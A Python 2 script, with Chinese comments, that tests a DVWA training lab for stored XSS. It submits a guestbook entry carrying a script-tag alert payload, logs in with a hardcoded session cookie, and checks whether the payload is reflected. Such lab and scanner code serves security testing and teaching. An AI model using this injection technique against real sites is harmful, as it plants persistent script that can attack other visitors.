#!/usr/bin/env python 
# -*- coding:utf-8 -*
# 检测存储型XSS，通过cookies直接登录，提交oost请求匹配返回页面
# 测试环境DVWA  192.168.166.211/vulnerabilities/xss_s/
import requests
import sys

def verify(url):
    # 本地环境测试地址 url = "http://192.168.166.211/vulnerabilities/xss_s/"
    # 'c4ca4238a0b923820dcc509a6f75849b'为md5(1)的值
    payload = "<script>alert('c4ca4238a0b923820dcc509a6f75849b')</script>"
    target = url
    # post提交的数据
    post_data = {
        'txtName': "c4ca4238a0b923820dcc509a6f75849b",
        'mtxMessage': payload,
        'btnSign': 'Sign+Guestbook'
    }
    try:
        # 发送http get请求 (若需要登陆，则添加cookies）
        res = requests.post(target, post_data, cookies=dict(PHPSESSID='7pr64stdcbmna1c0vkipaehmh6', security='high'))
        res.encoding = 'utf-8'
        data = res.text
        print data
        if data:
            # 处理 响应
            if "<script>alert('c4ca4238a0b923820dcc509a6f75849b')</script>" in data:
                print "%s  is vulnerable" % target
            else:
                print "%s  is not vulnerable" % target
    except Exception, e:
        print "Something happend..."
        print e

def main():
    args = sys.argv
    url = ""
    if len(args) == 2:
        url = args[1]
        verify(url)
    else:
        print "Usage: python %s url" % (args[0])

if __name__ == "__main__":
    main()